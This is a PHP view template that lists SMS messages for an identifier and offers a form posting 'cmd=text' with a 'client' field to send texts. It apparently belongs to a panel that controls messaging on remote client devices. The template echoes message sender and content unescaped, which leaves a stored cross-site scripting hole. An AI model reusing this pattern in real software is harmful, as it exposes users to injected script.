<?php require_once __DIR__ . "/../header.php"; ?>

<div class="container">
    <div class="row">
        <div class="col-md-12 page-header d-flex justify-content-between align-items-center">
            <h2 class="page-title"><?= $identifier ?> Messages</h2>
            <button class="btn btn-dark" data-toggle="modal" data-target="#smsModal"><i class="fas fa-plus"></i></button>
        </div>
    </div>
    <br>
    <div class="row">
        <div class="col-md-12">
            <div class="card">
                <div class="content">
                    <div class="canvas-wrapper">
                        <table class="table table-striped">
                            <thead class="success">
                                <tr>
                                    <th>Sender</th>
                                    <th>Message</th>
                                    <th>Timestamp</th>
                                </tr>
                            </thead>
                            <tbody class="files-class">
                                <?php if (count($messages) > 0): ?>
                                    <?php foreach ($messages as $message): ?>
                                        <tr>
                                            <td><?= $message->getSender(); ?></td>
                                            <td><?= $message->getContent(); ?></td>
                                            <td class="text-end"><?= $message->getTimestamp(); ?></td>
                                        </tr>
                                    <?php endforeach ?>
                                <?php else: ?>
                                    <tr class="text-center">
                                        No messages
                                    </tr>
                                <?php endif ?>              
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="smsModal" tabindex="-1" role="dialog" aria-labelledby="smsModal" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="sms-modal-title" id="smsModalLabel">SMS</h5>
          <button type="button" id="sms-modal-dismiss" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          <form action="/send" method="post">
            <div class="content">
                <textarea style="resize: none;" name="message" id="" cols="30" rows="5" class="form-control" placeholder="Message..."></textarea>
                <br>
                <input type="hidden" name="client" value="">
                <input type="hidden" name="cmd" value="text">
                <div class="input-group mb-3">
                <input type="tel" name="" class="form-control" placeholder="Phone number" aria-label="Phone number" aria-describedby="basic-addon2">
                <div class="input-group-append">
                    <button style="background: #2196F3 !important;color: white" type="submit" class="btn" id="modal-save">Send</button>      
                </div>
                </div>
                <button style="background: #2196F3 !important;color: white" type="button" class="btn col-12" id="modal-save"><i class="fas fa-download"></i>  Download Messages</button>
            </div>
          </form>
        </div>
      </div>
    </div>
</div>

<?php require_once __DIR__ . "/../footer.php"; ?>